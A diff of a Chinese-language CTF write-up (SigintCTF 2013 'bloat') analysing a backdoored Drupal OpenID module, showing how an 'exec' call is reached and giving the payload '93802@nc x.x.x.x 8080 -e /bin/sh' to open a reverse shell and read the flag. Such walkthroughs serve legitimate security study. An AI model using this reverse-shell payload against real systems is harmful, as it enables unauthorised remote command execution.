@@ -46,33 +46,37 @@ Description
     
 而原版中的openid是
 
-    22 /**
-    23  * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
-    24  */
-    25 define('OPENID_DH_DEFAULT_GEN', '2');
+```php
+22 /**
+23  * Diffie-Hellman generator; used for Diffie-Hellman key exchange computations.
+24  */
+25 define('OPENID_DH_DEFAULT_GEN', '2');
+```
     
 这是跟用户认证有关的一个常量。修改这种值也许会造成认证系统的一些缺陷。
 继续看代码，我有了更大的收获。
 
 在`./bloat/modules/openid/openid.module`中代码逻辑与原版有明显的不同。
 
-    197 function openid_login_validate($quench, &$tickers)
-    198    {
-    199 $return_to = $tickers['values']['openid.return_to'];
-    ...
-    204   openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
-    ... 
-    207      function openid_begin($imaginably, $overlay = '', $termination = array())
-    ...
-    212       if(strpos($imaginably, '@'))
-    213   {
-    214    list($user, $host) = explode('@', $imaginably, 2);                                                                                                                                         
-    215 }
-    216 else
-    217     {
-    218      $user = false;
-    219      $host = false;
-    220      }
+```
+197 function openid_login_validate($quench, &$tickers)
+198    {
+199 $return_to = $tickers['values']['openid.return_to'];
+...
+204   openid_begin($tickers['values']['openid_identifier'], $return_to, $tickers['values']);
+... 
+207      function openid_begin($imaginably, $overlay = '', $termination = array())
+...
+212       if(strpos($imaginably, '@'))
+213   {
+214    list($user, $host) = explode('@', $imaginably, 2);                                                                                                                                         
+215 }
+216 else
+217     {
+218      $user = false;
+219      $host = false;
+220      }
+```
     
 `214    list($user, $host) = explode('@', $imaginably, 2);`中`$imaginably`正是用户提交的认证用户名。
 再来看看这些变量做了什么。
@@ -92,25 +96,26 @@ drupal_map_assoc()返回的是数组，所以在redirect过程中会被强转成
 
 现在要做的就是找一个合适的函数，恰好能满足这个条件了。
 
-    slipper@NULL:~/CTF/SigintCTF2013/cloud/bloat/bloat/modules/openid$ php -a
-    Interactive shell
-    
-    php > include './openid.inc';
-    php > var_dump(is_callable('system'));
-    bool(true)
-    php > var_dump(is_callable('systeM'));
-    bool(true)
-    php > echo _openid_dh_base64_to_long('system')/OPENID_DH_DEFAULT_GEN ."\n";
-    34952922.72093
-    php > echo _openid_dh_base64_to_long('System')/OPENID_DH_DEFAULT_GEN ."\n";
-    14664196.395349
-    php > echo _openid_dh_base64_to_long('SYstem')/OPENID_DH_DEFAULT_GEN ."\n";
-    14347185.046512
-    php > echo _openid_dh_base64_to_long('eval')/OPENID_DH_DEFAULT_GEN ."\n";
-    93703.872093023
-    php > echo _openid_dh_base64_to_long('exec')/OPENID_DH_DEFAULT_GEN ."\n";
-    93802
+```
+slipper@NULL:~/CTF/SigintCTF2013/cloud/bloat/bloat/modules/openid$ php -a
+Interactive shell
 
+php > include './openid.inc';
+php > var_dump(is_callable('system'));
+bool(true)
+php > var_dump(is_callable('systeM'));
+bool(true)
+php > echo _openid_dh_base64_to_long('system')/OPENID_DH_DEFAULT_GEN ."\n";
+34952922.72093
+php > echo _openid_dh_base64_to_long('System')/OPENID_DH_DEFAULT_GEN ."\n";
+14664196.395349
+php > echo _openid_dh_base64_to_long('SYstem')/OPENID_DH_DEFAULT_GEN ."\n";
+14347185.046512
+php > echo _openid_dh_base64_to_long('eval')/OPENID_DH_DEFAULT_GEN ."\n";
+93703.872093023
+php > echo _openid_dh_base64_to_long('exec')/OPENID_DH_DEFAULT_GEN ."\n";
+93802
+```
 
 因为这里的is_callable是不区分大小写的，本来我还以为后门作者刻意选择了大小写混用的函数名，本来差点要写程序暴搜的。还好偶然发现exec正好符合要求。^_^
 
@@ -124,20 +129,22 @@ drupal_map_assoc()返回的是数组，所以在redirect过程中会被强转成
 
 用`93802@nc x.x.x.x 8080 -e /bin/sh`反弹，本地用`nc -l 8080`监听。
 
-    pwd
-    /var/www
-    ls -la ./
-    total 7904
-    drwxr-xr-x  9 root root    4096 Jul  5 01:23 .
-    drwxr-xr-x 14 root root    4096 Jul  5 01:53 ..
-    -rw-r--r--  1 root root   75028 Mar  7 17:26 CHANGELOG.txt
-    -rw-r--r--  1 root root    1481 Mar  7 17:26 COPYRIGHT.txt
-    ...
-    -rw-r--r--  1 root root      34 Jul  5 01:01 ___F_L_A_G___
-    ...
-    cat ___F_L_A_G___
-    not here, see /flag on filesystem
-    cat /flag
-    SIGINT_d4b0844c
+```
+pwd
+/var/www
+ls -la ./
+total 7904
+drwxr-xr-x  9 root root    4096 Jul  5 01:23 .
+drwxr-xr-x 14 root root    4096 Jul  5 01:53 ..
+-rw-r--r--  1 root root   75028 Mar  7 17:26 CHANGELOG.txt
+-rw-r--r--  1 root root    1481 Mar  7 17:26 COPYRIGHT.txt
+...
+-rw-r--r--  1 root root      34 Jul  5 01:01 ___F_L_A_G___
+...
+cat ___F_L_A_G___
+not here, see /flag on filesystem
+cat /flag
+SIGINT_d4b0844c
+```
 
 看来果然是木有写权限～～
